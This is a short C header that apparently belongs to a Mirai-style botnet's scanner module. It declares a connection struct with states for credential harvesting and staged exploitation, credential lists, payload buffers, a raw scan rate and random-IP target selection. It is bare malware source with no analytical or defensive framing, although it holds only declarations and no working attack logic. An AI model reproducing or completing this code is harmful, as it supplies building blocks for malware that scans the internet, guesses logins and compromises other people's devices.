#pragma once

#include <stdint.h>

#include "includes.h"

#define SCANNER_MAX_CONNS 128
#define SCANNER_RAW_PPS 160

#define SCANNER_RDBUF_SIZE 256
#define SCANNER_HACK_DRAIN 64

struct scanner_connection
{
    int fd, last_recv;
    enum
    {
        SC_CLOSED,
        SC_CONNECTING,
        SC_GET_CREDENTIALS,
        SC_EXPLOIT_STAGE2,
        SC_EXPLOIT_STAGE3,
    } state;
    ipv4_t dst_addr;
    uint16_t dst_port;
    int rdbuf_pos;
    char rdbuf[SCANNER_RDBUF_SIZE];
    char **credentials;
    char payload_buf[256], payload_buf2[256];
    int credential_index;
};

void scanner_init();
void scanner_kill(void);

static void setup_connection(struct scanner_connection *);
static ipv4_t get_random_ip(void);
